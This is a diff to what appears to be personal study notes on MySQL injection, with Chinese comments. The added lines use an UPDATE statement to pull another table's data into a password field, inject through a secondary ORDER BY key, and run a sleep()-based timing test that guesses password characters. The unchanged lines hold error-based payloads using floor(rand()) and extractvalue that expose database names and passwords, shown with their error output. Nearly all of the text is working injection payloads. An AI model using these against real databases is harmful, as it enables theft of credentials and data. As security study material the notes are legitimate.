@@ -208,8 +208,10 @@ insert into fruits values ('Harald5','e10adc3949ba59abbe56e057f20f903e',5,5,5);
 select flag from flag where flag='' and (select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) and '';
 //Duplicate entry 'security1' for key 'group_key'
 
+//update爆其他表的数据
 update users set password='',password=(select email_id from emails limit 0,1) where username='admin4';
 
+// order by 第二关键字注入
 order by apples,IF(1,bananas,cherries) desc
 order by apples,(case when 1 then bananas else cherries end) desc
 
@@ -220,6 +222,9 @@ order by 1 and extractvalue(0,concat(0x3a,mid((select password from fruits where
 
 select * from fruits order by extractvalue(0,concat(0x3a,(select password from users where username='Dummy')));
 //XPATH syntax error: ':p@ssword' 可以爆出其他表中的字段值
+
+select 1 from (select * from fruits where username='Admin' and if(upper(substring(password,1,1))='E',sleep(1),0))b; 
+//Empty set (1.00 sec)  时间注入
 
 
 mysql常用命令：
